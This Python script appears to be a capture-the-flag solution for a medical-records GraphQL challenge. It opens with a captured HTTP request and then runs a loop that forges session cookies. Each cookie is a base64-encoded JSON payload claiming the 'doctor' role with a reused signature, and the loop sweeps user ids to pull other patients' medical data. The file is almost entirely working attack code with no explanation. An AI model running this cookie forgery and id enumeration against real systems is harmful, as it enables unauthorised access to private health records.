import requests
import base64
import json
import re

"""
POST /graphql HTTP/2
Host: med-graph.tuctf.com
Cookie: Not-Part-Of-The-Challenge-Session-Cookie=1737841584.798.929.620629|7d9756d769494a2c7f2bd058ff4a8fdb; session=eyJpZCI6MTAxNSwibG9nZ2VkX2luIjp0cnVlLCJyb2xlIjoicGF0aWVudCJ9.Z5Vb4w.f0_acYjF1dlem7imaDdNQL7BP4Y
Content-Length: 394
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: */*
Origin: https://med-graph.tuctf.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://med-graph.tuctf.com/dashboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"query":"\n        {\n            userData {\n                name\n                age\n                medicalHistory\n                medications {\n                    name\n                    dosage\n                    description\n                }\n                doctor {\n                    name\n                    department\n                }\n            }\n        }\n    "}
"""

query = """
{
  userData {
    name
    age
    medicalHistory
    medications {
      name
      dosage
      description
    }
    doctor {
      name
      department
    }
  }
}
"""

headers = {"Content-Type": "application/json"}
cookie = {
    "Not-Part-Of-The-Challenge-Session-Cookie": "1737841584.798.929.620629|7d975494a2c7f2bd058ff4a8",
    "session": ""
}

initCookie = ".Z5VtDQ.F-gfYHL1JgUtDAZ_BHynryEUb4Y"
userObject = {
  "id": 1018,
  "logged_in": True,
  "role": "doctor"
}

for i in range(1018, 1100):
  userObject["id"] = i
  encoded_version = base64.b64encode(json.dumps(userObject, separators=(',', ':')).encode('utf-8')).decode('utf-8')
  encoded_version = re.sub(r'={0,2}$', '', encoded_version) 
  cookie["session"] =  encoded_version + initCookie
  response = requests.post("https://med-graph.tuctf.com/graphql", cookies=cookie, headers=headers, json={"query": query})
  if response.status_code == 200:
    respJson = response.json()
    if respJson["data"]["userData"]:
      print(respJson)
    print(i, response.text)
